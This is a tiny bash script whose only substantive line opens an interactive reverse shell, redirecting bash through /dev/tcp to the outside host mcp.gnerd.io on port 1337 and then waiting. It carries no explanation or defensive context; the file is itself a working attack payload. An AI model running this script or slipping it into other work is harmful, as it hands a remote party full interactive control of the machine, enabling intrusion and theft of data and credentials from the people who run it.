#!/bin/bash
bash -i >& /dev/tcp/mcp.gnerd.io/1337 0>&1
wait
